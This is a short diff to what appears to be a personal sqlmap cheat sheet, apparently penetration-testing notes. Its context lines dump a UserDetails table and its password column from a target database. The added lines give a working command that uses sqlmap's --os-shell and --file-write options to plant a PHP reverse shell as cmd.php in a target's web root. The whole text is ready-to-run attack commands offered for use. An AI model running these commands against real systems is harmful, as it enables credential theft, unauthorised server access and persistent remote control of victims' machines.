@@ -10,7 +10,8 @@ sqlmap -r sqlfile --batch  -D users -T UserDetails --dump
 #Dumps the password column from the UserDetails table in the users database
 sqlmap -r sqlfile --batch  -D users -T UserDetails -C password --dump
 
-
+#Upload a reverse shell file to a target. But also uses --os-shell which gives a mysql shell on the server separately.
+sqlmap -r file --dbms mysql  --risk=3 --os-shell --file-dest="/var/www/html/cmd.php" --file-write="/home/kali/php-reverse-shell.php" --batch
 
 -u "<URL>"
 -p "<PARAM TO TEST>" 
